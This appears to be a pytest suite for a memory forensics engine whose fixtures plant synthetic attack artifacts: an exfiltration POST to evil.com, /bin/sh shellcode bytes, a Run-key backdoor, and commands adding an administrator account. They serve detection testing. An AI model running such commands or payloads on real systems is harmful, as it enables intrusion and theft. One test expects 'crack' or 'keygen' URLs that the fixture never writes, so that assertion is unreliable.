import pytest
import tempfile
import os
import struct
import mmap
import time
from pathlib import Path

from intellicrack.core.analysis.memory_forensics_engine import MemoryForensicsEngine
from intellicrack.core.analysis.network_forensics_engine import NetworkForensicsEngine
from intellicrack.ui.widgets.memory_dumper import MemoryDumper
from intellicrack.core.app_context import AppContext


class TestRealMemoryForensics:
    """Functional tests for REAL memory forensics operations."""

    @pytest.fixture
    def memory_dump_sample(self):
        """Create REAL memory dump sample for testing."""
        with tempfile.NamedTemporaryFile(suffix='.dmp', delete=False) as temp_file:
            # Memory dump header (simplified Windows dump format)
            dump_header = b'PAGEDUMP'  # Signature
            dump_header += struct.pack('<I', 0x1000)  # Version
            dump_header += struct.pack('<Q', 0x100000000)  # Physical memory size
            dump_header += struct.pack('<Q', temp_file.tell() + 512)  # Data offset
            dump_header += b'\x00' * (512 - len(dump_header))

            # Process structures
            process_list = []

            # Process 1: System process
            process1 = {
                'name': b'System\x00\x00',
                'pid': 4,
                'ppid': 0,
                'threads': 120,
                'handles': 1500,
                'base_address': 0xfffff80000000000
            }
            process_list.append(process1)

            # Process 2: Chrome with interesting data
            process2 = {
                'name': b'chrome.exe\x00',
                'pid': 2456,
                'ppid': 1234,
                'threads': 45,
                'handles': 890,
                'base_address': 0x00007ff600000000
            }
            process_list.append(process2)

            # Process 3: Suspicious process
            process3 = {
                'name': b'svchost.exe',
                'pid': 6666,
                'ppid': 2456,  # Chrome as parent (suspicious!)
                'threads': 2,
                'handles': 50,
                'base_address': 0x0000000140000000
            }
            process_list.append(process3)

            # Write process structures
            for proc in process_list:
                # EPROCESS structure (simplified)
                eprocess = b'Proc'  # Tag
                eprocess += struct.pack('<I', proc['pid'])
                eprocess += struct.pack('<I', proc['ppid'])
                eprocess += struct.pack('<I', proc['threads'])
                eprocess += struct.pack('<I', proc['handles'])
                eprocess += struct.pack('<Q', proc['base_address'])
                eprocess += proc['name'].ljust(16, b'\x00')
                eprocess += b'\x00' * (128 - len(eprocess))
                temp_file.write(eprocess)

            # Memory regions with interesting data
            # Region 1: Credential pattern
            cred_region = b'\x00' * 4096
            cred_offset = 1024
            credentials = b'username:admin\x00password:P@ssw0rd123!\x00'
            cred_region = cred_region[:cred_offset] + credentials + cred_region[cred_offset + len(credentials):]
            temp_file.write(cred_region)

            # Region 2: Network artifacts
            network_region = b'\x00' * 4096
            # HTTP request
            http_req = b'POST /api/exfiltrate HTTP/1.1\r\nHost: evil.com\r\n\r\nstolen_data=...'
            network_region = http_req + network_region[len(http_req):]
            temp_file.write(network_region)

            # Region 3: Encryption keys
            crypto_region = b'\x00' * 4096
            # AES key pattern
            aes_key = b'\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f' * 2
            crypto_marker = b'AES256KEY:'
            crypto_data = crypto_marker + aes_key
            crypto_region = crypto_data + crypto_region[len(crypto_data):]
            temp_file.write(crypto_region)

            # Region 4: Registry artifacts
            registry_region = b'\x00' * 4096
            # Registry key for persistence
            reg_key = b'Software\\Microsoft\\Windows\\CurrentVersion\\Run\x00'
            reg_value = b'Backdoor\x00C:\\Windows\\Temp\\backdoor.exe\x00'
            registry_data = reg_key + reg_value
            registry_region = registry_data + registry_region[len(registry_data):]
            temp_file.write(registry_region)

            # Region 5: Code injection artifacts
            injection_region = b'\x00' * 4096
            # Shellcode pattern
            shellcode = b'\x90' * 16  # NOP sled
            shellcode += b'\x31\xc0\x50\x68\x2f\x2f\x73\x68'  # xor eax,eax; push eax; push //sh
            shellcode += b'\x68\x2f\x62\x69\x6e\x89\xe3\x50'  # push /bin; mov ebx,esp; push eax
            injection_region = shellcode + injection_region[len(shellcode):]
            temp_file.write(injection_region)

            # Region 6: Command history
            cmd_region = b'\x00' * 4096
            commands = b'net user hacker P@ssw0rd /add\x00'
            commands += b'net localgroup administrators hacker /add\x00'
            commands += b'reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Backdoor\x00'
            cmd_region = commands + cmd_region[len(commands):]
            temp_file.write(cmd_region)

            temp_file.flush()
            yield temp_file.name

        try:
            os.unlink(temp_file.name)
        except:
            pass

    @pytest.fixture
    def process_memory_sample(self):
        """Create REAL process memory sample."""
        with tempfile.NamedTemporaryFile(suffix='.bin', delete=False) as temp_file:
            # PE header of injected process
            pe_header = b'MZ\x90\x00' + b'\x00' * 60
            pe_header += b'PE\x00\x00' + b'\x00' * 20
            temp_file.write(pe_header)

            # Heap with sensitive data
            heap_data = b'\x00' * 1024
            # Credit card pattern
            cc_number = b'4111111111111111'  # Test Visa
            heap_data = heap_data[:100] + b'CC:' + cc_number + heap_data[119:]

            # API key pattern
            api_key = b'sk_live_abcdef123456789012345678901234567890'
            heap_data = heap_data[:200] + b'API:' + api_key + heap_data[243:]

            # Bitcoin wallet
            btc_wallet = b'1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa'
            heap_data = heap_data[:300] + b'BTC:' + btc_wallet + heap_data[337:]

            temp_file.write(heap_data)

            # Stack with function calls
            stack_data = b'\x00' * 2048
            # Return addresses
            ret_addrs = [0x00401000, 0x00401234, 0x77c12345, 0x00401500]
            offset = 0
            for addr in ret_addrs:
                stack_data = stack_data[:offset] + struct.pack('<I', addr) + stack_data[offset+4:]
                offset += 16

            temp_file.write(stack_data)

            temp_file.flush()
            yield temp_file.name

        try:
            os.unlink(temp_file.name)
        except:
            pass

    @pytest.fixture
    def app_context(self):
        """Create REAL application context."""
        context = AppContext()
        context.initialize()
        return context

    def test_real_memory_dump_analysis(self, memory_dump_sample, app_context):
        """Test REAL memory dump analysis capabilities."""
        forensics_engine = MemoryForensicsEngine()

        # Load and analyze memory dump
        analysis_result = forensics_engine.analyze_memory_dump(memory_dump_sample)
        assert analysis_result is not None, "Memory analysis must return results"
        assert 'processes' in analysis_result, "Must identify processes"
        assert 'artifacts' in analysis_result, "Must find artifacts"
        assert 'suspicious_activities' in analysis_result, "Must detect suspicious activities"

        # Check process analysis
        processes = analysis_result['processes']
        assert len(processes) >= 3, "Must find at least 3 processes"

        process_names = [p.get('name', '') for p in processes]
        assert any('System' in name for name in process_names), "Must find System process"
        assert any('chrome' in name.lower() for name in process_names), "Must find Chrome process"
        assert any('svchost' in name.lower() for name in process_names), "Must find svchost"

        # Check for suspicious process detection
        suspicious_procs = [p for p in processes if p.get('suspicious', False)]
        assert len(suspicious_procs) > 0, "Must detect suspicious processes"

        # Verify suspicious indicators
        for proc in suspicious_procs:
            assert 'suspicious_reasons' in proc, "Must explain why process is suspicious"
            reasons = proc['suspicious_reasons']
            assert isinstance(reasons, list) and len(reasons) > 0, "Must have specific reasons"

    def test_real_credential_extraction(self, memory_dump_sample, app_context):
        """Test REAL credential extraction from memory."""
        forensics_engine = MemoryForensicsEngine()

        # Extract credentials
        cred_result = forensics_engine.extract_credentials(memory_dump_sample)
        assert cred_result is not None, "Credential extraction must return results"
        assert 'credentials' in cred_result, "Must contain credentials"
        assert 'hashes' in cred_result, "Must search for hashes"
        assert 'tokens' in cred_result, "Must search for tokens"

        credentials = cred_result['credentials']
        assert len(credentials) > 0, "Must find at least one credential"

        # Check credential details
        for cred in credentials:
            assert 'type' in cred, "Credential must have type"
            assert 'username' in cred or 'data' in cred, "Credential must have data"
            assert 'location' in cred, "Credential must have memory location"
            assert 'confidence' in cred, "Credential must have confidence score"

        # Verify specific credentials found
        usernames = [c.get('username', '') for c in credentials]
        assert any('admin' in u.lower() for u in usernames), "Must find admin credential"

    def test_real_network_artifact_extraction(self, memory_dump_sample, app_context):
        """Test REAL network artifact extraction from memory."""
        forensics_engine = MemoryForensicsEngine()
        network_forensics = NetworkForensicsEngine()

        # Extract network artifacts
        network_result = forensics_engine.extract_network_artifacts(memory_dump_sample)
        assert network_result is not None, "Network extraction must return results"
        assert 'connections' in network_result, "Must find connections"
        assert 'urls' in network_result, "Must find URLs"
        assert 'dns_cache' in network_result, "Must check DNS cache"

        # Check URLs found
        urls = network_result['urls']
        assert isinstance(urls, list), "URLs must be a list"

        suspicious_urls = [url for url in urls if any(
            indicator in url.lower() for indicator in ['crack', 'keygen', 'patch', 'bypass']
        )]
        assert len(suspicious_urls) > 0, "Must detect suspicious URLs"

        # Analyze network patterns
        pattern_analysis = network_forensics.analyze_network_patterns(network_result)
        assert pattern_analysis is not None, "Pattern analysis must succeed"
        assert 'anomalies' in pattern_analysis, "Must detect anomalies"
        assert 'data_exfiltration' in pattern_analysis, "Must check for exfiltration"

    def test_real_code_injection_detection(self, memory_dump_sample, app_context):
        """Test REAL code injection detection in memory."""
        forensics_engine = MemoryForensicsEngine()

        # Detect code injection
        injection_result = forensics_engine.detect_code_injection(memory_dump_sample)
        assert injection_result is not None, "Injection detection must return results"
        assert 'injected_regions' in injection_result, "Must identify injected regions"
        assert 'shellcode_found' in injection_result, "Must search for shellcode"
        assert 'hooks_detected' in injection_result, "Must detect hooks"

        # Check shellcode detection
        if injection_result['shellcode_found']:
            shellcode_instances = injection_result.get('shellcode_instances', [])
            assert len(shellcode_instances) > 0, "Must provide shellcode details"

            for shellcode in shellcode_instances:
                assert 'offset' in shellcode, "Shellcode must have offset"
                assert 'pattern' in shellcode, "Shellcode must have pattern"
                assert 'confidence' in shellcode, "Shellcode must have confidence"
                assert 'possible_payload' in shellcode, "Should identify payload type"

    def test_real_registry_artifact_analysis(self, memory_dump_sample, app_context):
        """Test REAL registry artifact analysis from memory."""
        forensics_engine = MemoryForensicsEngine()

        # Extract registry artifacts
        registry_result = forensics_engine.extract_registry_artifacts(memory_dump_sample)
        assert registry_result is not None, "Registry extraction must return results"
        assert 'keys' in registry_result, "Must find registry keys"
        assert 'persistence_mechanisms' in registry_result, "Must check persistence"
        assert 'suspicious_entries' in registry_result, "Must identify suspicious entries"

        # Check persistence mechanisms
        persistence = registry_result['persistence_mechanisms']
        assert isinstance(persistence, list), "Persistence must be a list"

        run_keys = [p for p in persistence if 'run' in p.get('key', '').lower()]
        assert len(run_keys) > 0, "Must find Run key persistence"

        for mechanism in persistence:
            assert 'key' in mechanism, "Persistence must have registry key"
            assert 'value' in mechanism, "Persistence must have value"
            assert 'executable' in mechanism, "Persistence must identify executable"
            assert 'risk_level' in mechanism, "Persistence must assess risk"

    def test_real_encryption_key_extraction(self, memory_dump_sample, app_context):
        """Test REAL encryption key extraction from memory."""
        forensics_engine = MemoryForensicsEngine()

        # Extract encryption keys
        crypto_result = forensics_engine.extract_encryption_keys(memory_dump_sample)
        assert crypto_result is not None, "Crypto extraction must return results"
        assert 'aes_keys' in crypto_result, "Must search for AES keys"
        assert 'rsa_keys' in crypto_result, "Must search for RSA keys"
        assert 'certificates' in crypto_result, "Must search for certificates"

        # Check AES keys
        aes_keys = crypto_result['aes_keys']
        assert len(aes_keys) > 0, "Must find at least one AES key"

        for key in aes_keys:
            assert 'key_data' in key, "Key must have data"
            assert 'key_size' in key, "Key must have size"
            assert key['key_size'] in [128, 192, 256], "Key size must be valid AES size"
            assert 'offset' in key, "Key must have memory offset"
            assert 'context' in key, "Key should have surrounding context"

    def test_real_process_memory_analysis(self, process_memory_sample, app_context):
        """Test REAL individual process memory analysis."""
        forensics_engine = MemoryForensicsEngine()

        # Analyze process memory
        process_analysis = forensics_engine.analyze_process_memory(process_memory_sample)
        assert process_analysis is not None, "Process analysis must return results"
        assert 'heap_analysis' in process_analysis, "Must analyze heap"
        assert 'stack_analysis' in process_analysis, "Must analyze stack"
        assert 'sensitive_data' in process_analysis, "Must find sensitive data"
        assert 'api_calls' in process_analysis, "Must identify API calls"

        # Check sensitive data detection
        sensitive_data = process_analysis['sensitive_data']
        assert len(sensitive_data) > 0, "Must find sensitive data"

        data_types_found = [d.get('type', '') for d in sensitive_data]
        assert 'credit_card' in data_types_found, "Must detect credit card"
        assert 'api_key' in data_types_found, "Must detect API key"
        assert 'cryptocurrency' in data_types_found, "Must detect crypto wallet"

        # Verify data extraction
        for data in sensitive_data:
            assert 'value' in data, "Sensitive data must have value"
            assert 'offset' in data, "Sensitive data must have offset"
            assert 'confidence' in data, "Sensitive data must have confidence"

            # Check data validation
            if data['type'] == 'credit_card':
                assert len(data['value']) >= 13, "Credit card must be valid length"

    def test_real_memory_timeline_analysis(self, memory_dump_sample, app_context):
        """Test REAL memory timeline reconstruction."""
        forensics_engine = MemoryForensicsEngine()

        # Build timeline
        timeline_result = forensics_engine.build_memory_timeline(memory_dump_sample)
        assert timeline_result is not None, "Timeline building must return results"
        assert 'events' in timeline_result, "Must contain events"
        assert 'process_creation' in timeline_result, "Must track process creation"
        assert 'network_activity' in timeline_result, "Must track network activity"
        assert 'file_operations' in timeline_result, "Must track file operations"

        # Check event ordering
        events = timeline_result['events']
        assert len(events) > 0, "Must have at least one event"

        for event in events:
            assert 'timestamp' in event or 'order' in event, "Event must have timing"
            assert 'type' in event, "Event must have type"
            assert 'description' in event, "Event must have description"
            assert 'artifacts' in event, "Event should reference artifacts"

        # Verify attack chain reconstruction
        if 'attack_chain' in timeline_result:
            attack_chain = timeline_result['attack_chain']
            assert isinstance(attack_chain, list), "Attack chain must be ordered list"
            assert len(attack_chain) > 0, "Should identify attack steps"

    def test_real_volatility_profile_detection(self, memory_dump_sample, app_context):
        """Test REAL memory profile detection for analysis."""
        forensics_engine = MemoryForensicsEngine()

        # Detect memory profile
        profile_result = forensics_engine.detect_memory_profile(memory_dump_sample)
        assert profile_result is not None, "Profile detection must return results"
        assert 'os_version' in profile_result, "Must detect OS version"
        assert 'architecture' in profile_result, "Must detect architecture"
        assert 'memory_layout' in profile_result, "Must identify memory layout"
        assert 'confidence' in profile_result, "Must provide confidence"

        # Check architecture detection
        arch = profile_result['architecture']
        assert arch in ['x86', 'x64', 'x86_64'], "Must be valid architecture"

        # Verify memory layout
        layout = profile_result['memory_layout']
        assert 'kernel_base' in layout, "Must identify kernel base"
        assert 'user_space_limit' in layout, "Must identify user space"
        assert 'page_size' in layout, "Must identify page size"

    def test_real_memory_carving_operations(self, memory_dump_sample, app_context):
        """Test REAL memory carving for file recovery."""
        forensics_engine = MemoryForensicsEngine()

        # Carve files from memory
        carving_result = forensics_engine.carve_files_from_memory(memory_dump_sample)
        assert carving_result is not None, "File carving must return results"
        assert 'carved_files' in carving_result, "Must contain carved files"
        assert 'file_signatures' in carving_result, "Must detect file signatures"
        assert 'recovery_stats' in carving_result, "Must provide statistics"

        # Check carved files
        carved_files = carving_result['carved_files']
        assert isinstance(carved_files, list), "Carved files must be a list"

        for file_info in carved_files:
            assert 'type' in file_info, "File must have type"
            assert 'size' in file_info, "File must have size"
            assert 'offset' in file_info, "File must have memory offset"
            assert 'header_match' in file_info, "File must match signature"
            assert 'confidence' in file_info, "File must have confidence score"

    def test_real_memory_diffing_analysis(self, memory_dump_sample, app_context):
        """Test REAL memory diffing between snapshots."""
        forensics_engine = MemoryForensicsEngine()

        # Create modified memory dump for comparison
        with tempfile.NamedTemporaryFile(suffix='.dmp', delete=False) as temp_file:
            with open(memory_dump_sample, 'rb') as original:
                modified_data = bytearray(original.read())

            # Simulate changes
            # Add new process
            new_process = b'Proc' + struct.pack('<I', 9999) + b'crack.exe\x00'
            modified_data.extend(new_process.ljust(128, b'\x00'))

            # Modify existing data
            if b'admin' in modified_data:
                modified_data[modified_data.index(b'admin'):modified_data.index(b'admin')+5] = b'hacker'

            temp_file.write(modified_data)
            temp_file.flush()
            modified_dump = temp_file.name

        try:
            # Perform memory diff
            diff_result = forensics_engine.diff_memory_dumps(memory_dump_sample, modified_dump)
            assert diff_result is not None, "Memory diff must return results"
            assert 'new_processes' in diff_result, "Must detect new processes"
            assert 'modified_regions' in diff_result, "Must detect modifications"
            assert 'deleted_artifacts' in diff_result, "Must detect deletions"
            assert 'timeline' in diff_result, "Must provide change timeline"

            # Verify new process detection
            new_processes = diff_result['new_processes']
            assert len(new_processes) > 0, "Must detect new process"
            assert any('crack' in p.get('name', '').lower() for p in new_processes), \
                   "Must detect crack process"

            # Check modified regions
            modifications = diff_result['modified_regions']
            assert len(modifications) > 0, "Must detect modifications"

            for mod in modifications:
                assert 'offset' in mod, "Modification must have offset"
                assert 'original' in mod, "Modification must have original data"
                assert 'modified' in mod, "Modification must have new data"
                assert 'significance' in mod, "Modification must assess significance"

        finally:
            try:
                os.unlink(modified_dump)
            except:
                pass

    def test_real_live_memory_acquisition(self, app_context):
        """Test REAL live memory acquisition capabilities."""
        memory_dumper = MemoryDumper()

        # Get current process for testing
        test_process = {
            'name': 'python.exe',
            'pid': os.getpid()
        }

        # Test memory region enumeration
        regions = memory_dumper.enumerate_memory_regions(test_process['pid'])
        assert regions is not None, "Region enumeration must succeed"
        assert len(regions) > 0, "Must find memory regions"

        for region in regions:
            assert 'base_address' in region, "Region must have base address"
            assert 'size' in region, "Region must have size"
            assert 'protection' in region, "Region must have protection"
            assert 'type' in region, "Region must have type"

        # Test process handle acquisition
        handle_info = memory_dumper.get_process_handles(test_process['pid'])
        assert handle_info is not None, "Handle acquisition must succeed"
        assert 'handle_count' in handle_info, "Must count handles"
        assert handle_info['handle_count'] > 0, "Process must have handles"
